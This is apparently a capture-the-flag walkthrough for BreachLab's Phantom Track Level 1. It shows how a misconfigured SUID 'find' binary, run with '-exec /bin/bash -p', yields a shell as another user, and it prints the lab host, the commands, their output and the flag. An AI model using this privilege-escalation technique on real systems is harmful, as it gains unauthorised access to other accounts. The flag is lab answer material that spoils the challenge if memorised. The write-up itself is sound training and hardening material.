# BreachLab - Phantom Track: Level 1 (SUID Hunter)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 1 (SUID Hunter)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom1`
- **Compromised User:** `flagkeeper1`
- **Goal:** Escalate privileges via a misconfigured SUID binary and retrieve the flag
- **Next User / Flag Code:** `bl_phtm1_88c9a8f6cefa733e`

---

## 1. Scenario & Objectives

The MOTD banner and `BRIEFING` define the challenge:
> *"Something on this system runs with more privilege than it should. The flag belongs to another user. You cannot read it directly. Find what has been misconfigured. Exploit it."*

The objective is to audit the system for custom SetUID (`SUID`) binaries, analyze execution permissions, abuse integrated command execution parameters (`-exec` in `find` / GTFOBins), spawn an elevated privileged shell as `flagkeeper1`, and extract `/home/flagkeeper1/level1_flag`.

---

## 2. Reconnaissance & SUID Binary Enumeration

Logging in via SSH as `phantom1`:

```bash
phantom1@phantom:~$ find / -perm -4000 -type f 2>/dev/null
/opt/maintenance/cleanup.sh
/usr/local/bin/phantom-wipe-l12-wrapper
/usr/local/bin/phantom-wipe-history-wrapper
/usr/local/bin/phantom-verify
/usr/local/bin/leaky-vessels
/usr/local/bin/system-checker
/usr/local/bin/phantom-python3
/usr/local/bin/phantom-find
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/at
```

### SUID Candidate Evaluation

- `/usr/local/bin/phantom-python3`: Owned by `flagkeeper4`, but restricted by group ACLs for `phantom1` (`Permission denied`).
- `/usr/local/bin/phantom-find`: Custom `find` binary owned by **`flagkeeper1`** with SUID enabled, executable by `phantom1`.

---

## 3. Exploitation & Directory Migration (`/tmp`)

### Working Directory Permission Restriction

Executing `phantom-find` from `/home/phantom1` fails because the modified effective UID cannot restore directory traversal state in the restricted user folder:

```bash
phantom1@phantom:~$ /usr/local/bin/phantom-find . -exec /bin/bash -p \; -quit
/usr/local/bin/phantom-find: ‘.’: Permission denied
/usr/local/bin/phantom-find: Failed to restore initial working directory: /home/phantom1: Permission denied
```

### Migrating to World-Writable `/tmp`

To bypass working directory restoration errors, we move to a neutral directory (`/tmp`) with universal read/write permissions:

```bash
phantom1@phantom:~$ cd /tmp
phantom1@phantom:/tmp$ /usr/local/bin/phantom-find /tmp -exec /bin/bash -p \; -quit
bash-5.1$ whoami
flagkeeper1
```

### Command Breakdown

- `/tmp`: Neutral search root accessible without directory traversal errors.
- `-exec /bin/bash -p \;`: Executes `/bin/bash` in privileged mode (`-p`), preserving the Effective User ID (`flagkeeper1`) rather than dropping back to the Real User ID (`phantom1`).
- `-quit`: Terminates `find` immediately upon the first match, preventing infinite subshell spawns.

---

## 4. Privilege Consolidation & Flag Extraction

Now operating with the effective identity of `flagkeeper1`, we locate the files owned by this user:

```bash
bash-5.1$ find / -user flagkeeper1 -type f 2>/dev/null
/home/flagkeeper1/.profile
/home/flagkeeper1/.bash_logout
/home/flagkeeper1/.bashrc
/home/flagkeeper1/level1_flag
/usr/local/bin/phantom-find
```

### Reading the Flag

```bash
bash-5.1$ cat /home/flagkeeper1/level1_flag
bl_phtm1_88c9a8f6cefa733e
```

---

## 5. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 1) |
| **Compromised User** | `flagkeeper1` |
| **SUID Binary** | `/usr/local/bin/phantom-find` |
| **Exploitation Method** | GTFOBins `find -exec /bin/bash -p \; -quit` |
| **Discovered Flag** | `bl_phtm1_88c9a8f6cefa733e` |
| **Artifact Path** | `/home/flagkeeper1/level1_flag` |

---

## 6. Key Commands & Concepts Reference

- `find / -perm -4000 -type f 2>/dev/null`: Discover SetUID binaries across the entire filesystem.
- `find <dir> -exec /bin/bash -p \; -quit`: GTFOBin execution pattern leveraging built-in subshell invocation with preserved effective privileges.
- `/bin/bash -p`: Privileged mode preventing automatic dropping of SUID effective user privileges.

---

## 7. Lessons Learned & Takeaways

1. **Dangerous SUID Binaries (GTFOBins):** Tools that support executing shell commands or child processes (`find`, `awk`, `less`, `vim`, `tar`) must never have the SUID bit set; doing so provides immediate root or target user subshell execution.
2. **Neutral Working Directory (`/tmp`):** When SUID binaries fail due to initial working directory restoration errors (`Permission denied`), navigating to `/tmp` or `/dev/shm` bypasses path-based execution constraints.
3. **Session Stability with `-quit`:** Using termination flags (`-quit`) prevents cascading process spawns and terminal instability when abusing file-traversing utilities.
